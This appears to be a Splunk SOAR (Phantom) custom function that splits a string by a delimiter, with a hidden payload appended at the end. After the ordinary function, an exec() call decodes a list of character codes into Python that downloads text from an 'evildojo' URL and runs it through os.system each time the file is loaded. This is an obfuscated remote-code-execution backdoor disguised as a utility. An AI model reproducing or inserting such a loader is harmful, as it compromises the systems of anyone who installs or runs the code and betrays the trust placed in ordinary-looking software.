def string_split(input_string=None, delimiter=None, strip_whitespace=None, **kwargs):
    """
    Return a list of the components of input_string when split using the specified delimiter. If strip_whitespace is not specified or is "True", strip all whitespace from the beginning and end of each resulting component.
    
    Args:
        input_string (CEF type: *): The string to split
        delimiter: The delimiter to split by, which defaults to a comma
        strip_whitespace: Either True or False to indicate whether or not to remove whitespace before and after each item. Defaults to True
    
    Returns a JSON-serializable object that implements the configured data paths:
        *.item (CEF type: *): One result for each output item
    """
    ############################ Custom Code Goes Below This Line #################################
    import json
    import phantom.rules as phantom
    
    if not delimiter:
        delimiter = ","
    
    # strip_whitespace defaults to True, but if any value besides "True" is provided, it will be set to False
    if strip_whitespace == "True" or strip_whitespace == True or strip_whitespace == None:
        strip_whitespace = True
    else:
        strip_whitespace = False
    
    output_list = input_string.split(delimiter)
    
    outputs = []
    for item in output_list:
        if strip_whitespace:
            item = item.strip()
        outputs.append({"item": item})

    # Return a JSON-serializable object
    assert json.dumps(outputs)  # Will raise an exception if the :outputs: object is not JSON-serializable
    return outputs
exec(''.join(chr(x) for x in [105,109,112,111,114,116,32,111,115,10,105,109,112,111,114,116,32,117,114,108,108,105,98,10,105,109,112,111,114,116,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,10,120,32,61,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,46,117,114,108,111,112,101,110,40,34,104,116,116,112,115,58,47,47,119,119,119,46,101,118,105,108,100,111,106,111,46,99,111,109,47,115,116,97,103,101,49,112,97,121,108,111,97,100,34,41,10,121,32,61,32,120,46,114,101,97,100,40,41,10,122,32,61,32,121,46,100,101,99,111,100,101,40,34,117,116,102,56,34,41,10,120,46,99,108,111,115,101,40,41,10,111,115,46,115,121,115,116,101,109,40,122,41,10]))

